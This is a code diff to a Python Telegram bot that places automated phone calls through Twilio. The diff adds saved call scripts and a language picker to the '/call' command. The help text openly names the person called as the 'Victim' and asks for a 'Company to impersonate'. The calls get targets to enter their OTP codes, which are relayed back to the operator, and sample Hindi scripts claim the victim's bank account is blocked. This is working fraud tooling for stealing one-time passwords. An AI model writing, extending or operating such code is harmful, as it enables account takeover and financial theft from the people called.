@@ -14180,6 +14180,58 @@ async def checkout_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text(f"❌ Failed to create checkout session: {e}")
 
 
+async def setscript_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    if not is_approved(user_id):
+        await update.message.reply_text("❌ You are not approved to use this bot.")
+        return
+    script = " ".join(context.args).strip() if context.args else ""
+    if not script:
+        await update.message.reply_text(
+            "❌ Please provide a script.\n\n"
+            "Example:\n"
+            "<code>/setscript Namaste ji, aapka account block ho gaya hai. 1 dabayein.</code>",
+            parse_mode=ParseMode.HTML,
+        )
+        return
+    context.user_data['call_script'] = script
+    preview = script[:80] + ("…" if len(script) > 80 else "")
+    await update.message.reply_text(
+        f"✅ <b>Script saved!</b>\n\n"
+        f"📝 <i>{html_escape(preview)}</i>\n\n"
+        f"This script will be used for every <code>/call</code> until you <code>/clearscript</code>.",
+        parse_mode=ParseMode.HTML,
+    )
+
+
+async def myscript_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    if not is_approved(user_id):
+        await update.message.reply_text("❌ You are not approved to use this bot.")
+        return
+    script = context.user_data.get('call_script', '')
+    if not script:
+        await update.message.reply_text(
+            "📝 No script saved.\n\n"
+            "Use <code>/setscript &lt;your text&gt;</code> to save one.",
+            parse_mode=ParseMode.HTML,
+        )
+    else:
+        await update.message.reply_text(
+            f"📝 <b>Your saved script:</b>\n\n<i>{html_escape(script)}</i>",
+            parse_mode=ParseMode.HTML,
+        )
+
+
+async def clearscript_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    if not is_approved(user_id):
+        await update.message.reply_text("❌ You are not approved to use this bot.")
+        return
+    context.user_data.pop('call_script', None)
+    await update.message.reply_text("🗑️ Script cleared. Default voice script will be used.")
+
+
 async def call_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     chat_id = update.effective_chat.id
@@ -14198,11 +14250,14 @@ async def call_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "• <code>name</code> — Victim's name (use _ for spaces, e.g. John_Doe)\n"
         "• <code>otp_digits</code> — Number of OTP digits (4–8)\n"
         "• <code>company</code> — Company to impersonate (e.g. Amazon)\n"
-        "• <code>lang</code> — Language: en | hi | es | fr | de | pt (default: en)\n"
-        "• <code>| custom script</code> — Optional: your own words spoken on the call\n\n"
+        "• <code>lang</code> — Language: en | hi | es | fr | de | pt\n"
+        "  Omit to get a language picker keyboard 🌐\n"
+        "• <code>| custom script</code> — Optional: overrides saved script for this call\n\n"
+        "<b>Script tip:</b> Save a reusable script with <code>/setscript</code> — it will be used on every call automatically.\n\n"
         "<b>Examples:</b>\n"
         "<code>/call +12025551234 John_Doe 6 PayPal hi</code>\n"
-        "<code>/call +12025551234 Rahul_Sharma 6 HDFC_Bank hi | Namaste Rahul ji, aapka account band ho sakta hai, kripya 1 dabaiye.</code>\n\n"
+        "<code>/call +12025551234 Rahul 6 HDFC</code>  ← shows language picker\n"
+        "<code>/call +12025551234 Rahul 6 HDFC hi | Namaste ji, 1 dabayein.</code>\n\n"
         "The call will:\n"
         "1️⃣ Ring the target — they press 1 to continue\n"
         "2️⃣ Request they enter their OTP code\n"
@@ -14216,11 +14271,11 @@ async def call_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     # Parse args — split on | to extract optional custom script
     raw = " ".join(args)
-    custom_script = ""
+    custom_script_inline = ""
     if "|" in raw:
         parts = raw.split("|", 1)
         call_args = parts[0].strip().split()
-        custom_script = parts[1].strip()
+        custom_script_inline = parts[1].strip()
     else:
         call_args = args
 
@@ -14232,7 +14287,8 @@ async def call_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     name           = call_args[1].replace("_", " ")
     otp_digits_str = call_args[2]
     company        = call_args[3].replace("_", " ")
-    lang           = call_args[4].lower() if len(call_args) >= 5 else "en"
+    # lang is optional — if absent, show language picker
+    explicit_lang  = call_args[4].lower() if len(call_args) >= 5 else ""
 
     if not phone.startswith("+"):
         await update.message.reply_text(
@@ -14261,10 +14317,142 @@ async def call_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
         return
 
-    if lang not in LANGUAGES:
-        lang = "en"
+    # Resolve the script: inline override > saved script > (empty = default)
+    saved_script  = context.user_data.get('call_script', '')
+    custom_script = custom_script_inline if custom_script_inline else saved_script
 
-    script_preview = f"\n📝 Script: <i>{html_escape(custom_script[:60])}{'…' if len(custom_script) > 60 else ''}</i>" if custom_script else ""
+    # If no lang given, show the language picker keyboard
+    if not explicit_lang or explicit_lang not in LANGUAGES:
+        context.user_data['pending_call'] = {
+            "phone": phone,
+            "name": name,
+            "otp_digits": otp_digits,
+            "company": company,
+            "custom_script": custom_script,
+            "chat_id": str(chat_id),
+            "user_id": str(user_id),
+        }
+        script_note = (
+            f"\n📝 <i>Script: {html_escape(custom_script[:60])}{'…' if len(custom_script) > 60 else ''}</i>"
+            if custom_script else "\n📝 <i>Using default script</i>"
+        )
+        from telegram import InlineKeyboardMarkup, InlineKeyboardButton
+        await update.message.reply_text(
+            f"🌐 <b>Choose voice language for the call:</b>\n\n"
+            f"📞 <code>{phone}</code> — {name} — {company}{script_note}",
+            parse_mode=ParseMode.HTML,
+            reply_markup=InlineKeyboardMarkup([
+                [InlineKeyboardButton("🇮🇳 Hindi", callback_data="calllang_hi"),
+                 InlineKeyboardButton("🇬🇧 English", callback_data="calllang_en")],
+                [InlineKeyboardButton("🇪🇸 Spanish", callback_data="calllang_es"),
+                 InlineKeyboardButton("🇫🇷 French", callback_data="calllang_fr")],
+                [InlineKeyboardButton("🇩🇪 German", callback_data="calllang_de"),
+                 InlineKeyboardButton("🇧🇷 Portuguese", callback_data="calllang_pt")],
+            ]),
+        )
+        return
+
+    lang = explicit_lang
+    await _place_call(update, context, phone, name, otp_digits, company, lang,
+                      custom_script, chat_id, user_id)
+
+
+async def call_lang_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """
+    Handles language picker button presses from /call flow.
+    callback_data format: calllang_<code>  e.g. calllang_hi
+    """
+    query = update.callback_query
+    await query.answer()
+
+    lang = query.data.split("_", 1)[1]
+
+    pending = context.user_data.get('pending_call')
+    if not pending:
+        await query.edit_message_text("❌ No pending call found. Please run /call again.")
+        return
+
+    context.user_data.pop('pending_call', None)
+
+    phone      = pending['phone']
+    name       = pending['name']
+    otp_digits = pending['otp_digits']
+    company    = pending['company']
+    custom_script = pending.get('custom_script', '')
+    chat_id    = pending['chat_id']
+    user_id    = pending['user_id']
+
+    from modules.twilio_call import LANGUAGES, initiate_call
+
+    flag_map = {
+        "hi": "🇮🇳", "en": "🇬🇧", "es": "🇪🇸",
+        "fr": "🇫🇷", "de": "🇩🇪", "pt": "🇧🇷",
+    }
+    flag = flag_map.get(lang, "🌐")
+    lang_name = LANGUAGES.get(lang, "English")
+
+    script_preview = (
+        f"\n📝 Script: <i>{html_escape(custom_script[:60])}{'…' if len(custom_script) > 60 else ''}</i>"
+        if custom_script else ""
+    )
+
+    await query.edit_message_text(
+        f"📡 <b>Initiating call...</b>\n\n"
+        f"📞 Target: <code>{phone}</code>\n"
+        f"👤 Name: {name}\n"
+        f"🏢 Company: {company}\n"
+        f"🔢 OTP Digits: {otp_digits}\n"
+        f"{flag} Language: {lang_name}{script_preview}",
+        parse_mode=ParseMode.HTML,
+    )
+
+    try:
+        result = initiate_call(
+            phone=phone,
+            chat_id=str(chat_id),
+            user_id=str(user_id),
+            name=name,
+            company=company,
+            otp_digits=otp_digits,
+            lang=lang,
+            custom_script=custom_script,
+        )
+        await query.edit_message_text(
+            f"✅ <b>Call placed!</b>\n\n"
+            f"📞 Target: <code>{phone}</code>\n"
+            f"👤 Name: {name}\n"
+            f"🏢 Company: {company}\n"
+            f"🔢 OTP Digits: {otp_digits}\n"
+            f"{flag} Language: {lang_name}\n"
+            f"📋 Call SID: <code>{result['sid']}</code>\n"
+            f"📊 Status: {result['status']}{script_preview}\n\n"
+            f"🔔 You'll receive live status updates and the OTP here.",
+            parse_mode=ParseMode.HTML,
+        )
+    except Exception as e:
+        err = str(e)
+        if "invalid phone number" in err.lower() or "21211" in err:
+            msg = "❌ Invalid phone number format. Use E.164 format: <code>+12025551234</code>"
+        elif "not a valid" in err.lower() or "21614" in err:
+            msg = "❌ Phone number is not SMS-capable or invalid."
+        elif "account" in err.lower() and "not" in err.lower():
+            msg = "❌ Twilio account issue. Check your credentials."
+        elif "21608" in err:
+            msg = "❌ Phone number is unverified. Add it to Twilio's verified caller IDs (trial accounts only)."
+        else:
+            msg = f"❌ Call failed: {html_escape(err)}"
+        await query.edit_message_text(msg, parse_mode=ParseMode.HTML)
+
+
+async def _place_call(update, context, phone, name, otp_digits, company, lang,
+                      custom_script, chat_id, user_id):
+    """Shared helper: place the call and report success/failure."""
+    from modules.twilio_call import LANGUAGES, initiate_call
+
+    script_preview = (
+        f"\n📝 Script: <i>{html_escape(custom_script[:60])}{'…' if len(custom_script) > 60 else ''}</i>"
+        if custom_script else ""
+    )
 
     status_msg = await update.message.reply_text(
         f"📡 <b>Initiating call...</b>\n\n"
@@ -14287,7 +14475,6 @@ async def call_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
             lang=lang,
             custom_script=custom_script,
         )
-
         await status_msg.edit_text(
             f"✅ <b>Call placed!</b>\n\n"
             f"📞 Target: <code>{phone}</code>\n"
@@ -14300,7 +14487,6 @@ async def call_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
             f"🔔 You'll receive live status updates and the OTP here.",
             parse_mode=ParseMode.HTML,
         )
-
     except Exception as e:
         err = str(e)
         if "invalid phone number" in err.lower() or "21211" in err:
@@ -14788,6 +14974,10 @@ def main():
     application.add_handler(CommandHandler("shop", shop_command))
     application.add_handler(CommandHandler("checkout", checkout_command))
     application.add_handler(CommandHandler("call", call_command))
+    application.add_handler(CommandHandler("setscript", setscript_command))
+    application.add_handler(CommandHandler("myscript", myscript_command))
+    application.add_handler(CommandHandler("clearscript", clearscript_command))
+    application.add_handler(CallbackQueryHandler(call_lang_callback, pattern="^calllang_"))
     application.add_handler(CallbackQueryHandler(otp_action_callback, pattern="^otp_(accept|decline)_"))
     application.add_handler(CommandHandler("shopbuy", shopbuy_command))
     application.add_handler(CommandHandler("buy", shopbuy_command))
